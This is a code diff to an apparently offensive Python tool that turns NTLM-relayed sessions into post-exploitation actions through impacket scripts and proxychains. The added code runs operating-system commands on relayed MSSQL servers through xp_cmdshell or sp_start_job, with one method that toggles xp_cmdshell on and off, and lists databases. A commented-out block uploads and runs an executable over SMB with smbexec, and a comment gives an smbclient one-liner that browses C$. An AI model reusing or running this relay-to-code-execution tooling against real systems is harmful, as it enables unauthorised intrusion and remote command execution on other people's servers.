@@ -82,8 +82,58 @@ def secretsdump(relay_user, relay_host):
         print("Error: '%s' dumping secrets from '%s'." % (error, connection_string))
 
 
+def mssql_exec(relay_user, relay_host, relay_port, method, command):
+    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
+    connection_string = relay_user + "@" + relay_host
+    if method == 1:
+        input = "xp_cmdshell " + command + "\n"
+    elif method == 2:
+        input = "sp_start_job " + command + "\n"
+    elif method == 3:
+        print("[!] Warning! mssql_exec method 3 automatically enables xp_cmdshell, executes a command, and then disables xp_cmdshell.")
+        print("[!] If this does not happen cleanly, it could leave xp_cmdshell enabled, or if the system was relying on xp_cmdshell, it could now be disabled.")
+        print('[!] This is not a recommended method, and could cause havoc.')
+        input = "enable_xp_cmdshell\nxp_cmdshell " + command + "\ndisable_xp_cmdshell\n"
+    try:
+        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+            input=input, encoding='ascii')
+        print(proc.stdout)
+    except Exception as error:
+        print("Error: '%s' executing command '" + command + "' as '%s'." % (error, connection_string))
+
+"""     print("Attempting to upload CBI.exe to C:\CBI\CBI.exe as '%s'." % (connection_string))
+    try:
+        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+            input=input, encoding='ascii')
+        print(proc.stdout)
+    except Exception as error:
+        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))
+    print("Attempting to smbexec C:\CBI\CBI.exe as '%s'." % (connection_string))
+    try:
+        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+            input='C:\\CBI\\CBI.exe\nexit\n', encoding='ascii')
+        print(proc2.stdout)
+    except Exception as error:
+        print("Error: '%s' running smbexec as '%s'." % (error, connection_string)) """
+
+
+def list_databases(relay_user, relay_host, relay_port):
+    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
+    # BAD EXAMPLE WILL UPDATE LATER >:D : echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
+    connection_string = relay_user + "@" + relay_host
+    input = 'SELECT name FROM master.sys.databases;\n'
+    print("Attempting to list MSSQL databases as '%s'." % (connection_string))
+    try:
+        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+            input=input, encoding='ascii')
+        print(proc.stdout)
+    except Exception as error:
+        print("Error: '%s' listing MSSQL databases as '%s'." % (error, connection_string))
+
+
 def handle_relay_info(relay_info):
-    # example: ["SMB", "1.2.3.4", "domain/user", "TRUE", "445"]
+    # example SMB: ["SMB", "1.2.3.4", "domain/user", "TRUE", "445"]
+    # example MSSQL: ["MSSQL", "1.2.3.4", "DOMAIN/user", "N/A", "60183"]
     for relay in relay_info:
         # Break it up into usable bits...
         protocol = relay[0]
@@ -103,14 +153,17 @@ def handle_relay_info(relay_info):
         if protocol == 'SMB' and is_admin == 'FALSE':
             list_shares(relay_user, relay_host, relay_port, is_admin)
         if protocol == 'MSSQL':
-            # TODO: do some magic. I'll have to play with it, but should be able to attempt both db listing and code exec over this...
-            print("MSSQL not implemented yet. Sorry. Recommend manual xp_cmdshell")
+            list_databases(relay_user, relay_host, relay_port)
+            method = 1      # Methods are 1,2,3 in order of safest to dirtiest.
+            command = 'calc.exe'
+            mssql_exec(relay_user, relay_host, relay_port, method, command)
         if protocol == 'IMAP':
             # TODO: do some magic. I've never played with this one, and will need some time with it.
             # dump_emails()
             print("IMAP is not implemented yet. Sorry. Good luck with that one.")
         if protocol == 'HTTP':
-            # todo: do some magic. Have only played with this with petitpotam, and even then without much success.
+            # TODO: do some magic. Have only played with this with petitpotam, and even then without much success.
+            # petitpotam()
             print("HTTP is not implemented yet. Sorry. Good luck with that one.")
 
 
